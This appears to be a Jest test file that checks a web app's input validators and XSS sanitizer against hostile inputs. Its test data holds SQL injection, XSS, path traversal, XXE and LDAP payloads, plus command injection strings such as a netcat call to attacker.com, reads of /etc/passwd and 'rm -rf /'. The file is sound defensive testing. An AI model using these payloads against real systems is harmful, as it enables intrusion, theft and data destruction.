/**
 * Security Tests: Input Validation
 * 
 * Tests for:
 * - SQL injection prevention
 * - XSS prevention
 * - Input sanitization
 * - Oversized payload handling
 */

const {
  validateEmail,
  validateUUID,
  validateURL,
  validateFileType,
  validateString,
  sanitizeXSS,
  parseJSONBody
} = require('../../lib/validators');
const { ValidationError } = require('../../lib/errors');

describe('Security: Input Validation', () => {
  describe('Email Validation', () => {
    it('should reject SQL injection in email', () => {
      const maliciousEmails = [
        "test'; DROP TABLE users; --@example.com",
        "test' OR '1'='1'@example.com",
        "test' UNION SELECT * FROM passwords --@example.com"
      ];

      maliciousEmails.forEach(email => {
        expect(() => validateEmail(email)).toThrow(ValidationError);
      });
    });

    it('should reject XSS in email', () => {
      const xssEmails = [
        '<script>alert("xss")</script>@example.com',
        'test@example.com<script>',
        'test@<img src=x onerror=alert(1)>.com'
      ];

      xssEmails.forEach(email => {
        expect(() => validateEmail(email)).toThrow(ValidationError);
      });
    });

    it('should normalize email case', () => {
      const result = validateEmail('Test.User@Example.COM');
      expect(result).toBe('test.user@example.com');
    });

    it('should trim whitespace', () => {
      const result = validateEmail('  test@example.com  ');
      expect(result).toBe('test@example.com');
    });

    it('should reject oversized email', () => {
      const longEmail = 'a'.repeat(250) + '@example.com';
      expect(() => validateEmail(longEmail)).toThrow(ValidationError);
    });

    it('should reject null bytes', () => {
      expect(() => validateEmail('test\x00@example.com')).toThrow(ValidationError);
    });
  });

  describe('UUID Validation', () => {
    it('should reject non-UUID strings', () => {
      const invalidUUIDs = [
        '<script>alert(1)</script>',
        "'; DROP TABLE; --",
        '../../etc/passwd',
        'null',
        'undefined'
      ];

      invalidUUIDs.forEach(uuid => {
        expect(() => validateUUID(uuid)).toThrow(ValidationError);
      });
    });

    it('should accept valid UUID v4', () => {
      const validUUID = '550e8400-e29b-41d4-a716-446655440000';
      expect(() => validateUUID(validUUID)).not.toThrow();
    });

    it('should reject UUID with SQL injection', () => {
      expect(() => validateUUID("550e8400-e29b-41d4-a716-446655440000' OR '1'='1"))
        .toThrow(ValidationError);
    });
  });

  describe('URL Validation', () => {
    it('should reject non-HTTPS URLs', () => {
      expect(() => validateURL('http://example.com/image.jpg'))
        .toThrow(ValidationError);
    });

    it('should reject file protocol URLs', () => {
      expect(() => validateURL('file:///etc/passwd'))
        .toThrow(ValidationError);
    });

    it('should reject javascript protocol URLs', () => {
      expect(() => validateURL('javascript:alert(1)'))
        .toThrow(ValidationError);
    });

    it('should reject data URLs', () => {
      expect(() => validateURL('data:text/html,<script>alert(1)</script>'))
        .toThrow(ValidationError);
    });

    it('should reject oversized URLs', () => {
      const longUrl = 'https://example.com/' + 'a'.repeat(2100);
      expect(() => validateURL(longUrl)).toThrow(ValidationError);
    });

    it('should reject URLs with control characters', () => {
      expect(() => validateURL('https://example.com/\x00image.jpg'))
        .toThrow(ValidationError);
    });

    it('should accept valid S3 URLs', () => {
      expect(() => validateURL('https://wishlize-uploads.s3.ap-south-1.amazonaws.com/test.jpg'))
        .not.toThrow();
    });
  });

  describe('String Validation', () => {
    it('should reject strings with script tags', () => {
      expect(() => validateString('<script>alert(1)</script>'))
        .toThrow(ValidationError);
    });

    it('should reject strings with event handlers', () => {
      expect(() => validateString('<img src=x onerror=alert(1)>'))
        .toThrow(ValidationError);
    });

    it('should reject oversized strings', () => {
      const longString = 'a'.repeat(1001);
      expect(() => validateString(longString, { maxLength: 1000 }))
        .toThrow(ValidationError);
    });

    it('should reject null bytes in strings', () => {
      expect(() => validateString('test\x00string'))
        .toThrow(ValidationError);
    });

    it('should accept valid strings', () => {
      expect(() => validateString('Hello World 123')).not.toThrow();
    });
  });

  describe('XSS Sanitization', () => {
    it('should escape HTML tags', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizeXSS(input);
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
    });

    it('should escape HTML entities', () => {
      const input = '<img src=x onerror=alert(1)>';
      const result = sanitizeXSS(input);
      expect(result).not.toContain('<img');
      expect(result).toContain('&lt;img');
    });

    it('should escape quotes', () => {
      const input = '"onclick="alert(1)';
      const result = sanitizeXSS(input);
      expect(result).toContain('&quot;');
    });

    it('should handle null input', () => {
      expect(sanitizeXSS(null)).toBeNull();
    });

    it('should handle non-string input', () => {
      expect(sanitizeXSS(123)).toBe(123);
    });
  });

  describe('JSON Body Parsing', () => {
    it('should reject non-JSON input', () => {
      expect(() => parseJSONBody('not json')).toThrow(ValidationError);
    });

    it('should reject JSON primitives', () => {
      expect(() => parseJSONBody('123')).toThrow(ValidationError);
      expect(() => parseJSONBody('"string"')).toThrow(ValidationError);
      expect(() => parseJSONBody('true')).toThrow(ValidationError);
    });

    it('should reject null body', () => {
      expect(() => parseJSONBody(null)).toThrow(ValidationError);
    });

    it('should accept valid JSON object', () => {
      const result = parseJSONBody('{"key": "value"}');
      expect(result).toEqual({ key: 'value' });
    });

    it('should accept already parsed object', () => {
      const obj = { key: 'value' };
      const result = parseJSONBody(obj);
      expect(result).toBe(obj);
    });

    it('should reject oversized JSON', () => {
      // API Gateway has 10MB limit, but we should be stricter
      const largeObj = { data: 'a'.repeat(20 * 1024 * 1024) };
      // This would be caught by body size limits before parsing
    });
  });

  describe('File Type Validation', () => {
    it('should reject executable MIME types', () => {
      const dangerousTypes = [
        'application/x-msdownload',
        'application/x-executable',
        'application/x-sh',
        'application/x-php',
        'text/javascript'
      ];

      dangerousTypes.forEach(type => {
        expect(() => validateFileType(type)).toThrow(ValidationError);
      });
    });

    it('should reject MIME type with null bytes', () => {
      expect(() => validateFileType('image/jpeg\x00.exe'))
        .toThrow(ValidationError);
    });

    it('should accept valid image types', () => {
      expect(() => validateFileType('image/jpeg')).not.toThrow();
      expect(() => validateFileType('image/png')).not.toThrow();
    });
  });

  describe('Comprehensive Security Tests', () => {
    it('should handle path traversal attempts', () => {
      const paths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
      ];

      paths.forEach(path => {
        // These would typically be in file uploads, not string validation
        // but we should be aware of them
        expect(() => validateString(path, { pattern: /^[a-zA-Z0-9_-]+$/ }))
          .toThrow(ValidationError);
      });
    });

    it('should handle command injection attempts', () => {
      const payloads = [
        '$(whoami)',
        '`cat /etc/passwd`',
        '; cat /etc/passwd',
        '| nc attacker.com 1234',
        '&& rm -rf /'
      ];

      payloads.forEach(payload => {
        // These should be rejected by pattern validation if applicable
        expect(() => validateEmail(payload)).toThrow(ValidationError);
      });
    });

    it('should handle XML injection attempts', () => {
      const payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]>'
      ];

      payloads.forEach(payload => {
        expect(() => validateString(payload)).toThrow(ValidationError);
      });
    });

    it('should handle LDAP injection attempts', () => {
      const payloads = [
        '*)(uid=*))(&(uid=*',
        'admin)(&)',
        '*)(&(objectClass=*'
      ];

      payloads.forEach(payload => {
        expect(() => validateString(payload, { pattern: /^[a-zA-Z0-9@._-]+$/ }))
          .toThrow(ValidationError);
      });
    });
  });
});
